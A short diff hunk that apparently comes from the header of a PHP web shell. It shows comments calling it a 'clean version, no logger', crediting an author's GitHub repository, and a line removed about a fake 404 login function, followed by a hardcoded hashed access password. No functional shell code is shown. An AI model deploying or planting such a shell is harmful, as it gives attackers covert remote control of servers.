@@ -3,7 +3,6 @@
 
 // THIS IS CLEAN VERSION, NO LOGGER.
 // pwnsauce | https://github.com/pwnsauce403/deo
-// 500 ERROR? REMOVE THE 404 NOT FOUND LOGIN FUNCTION
 
 
 $auth_pass = "a6d13df8a46cf713e5cda6a6c0d043bf";
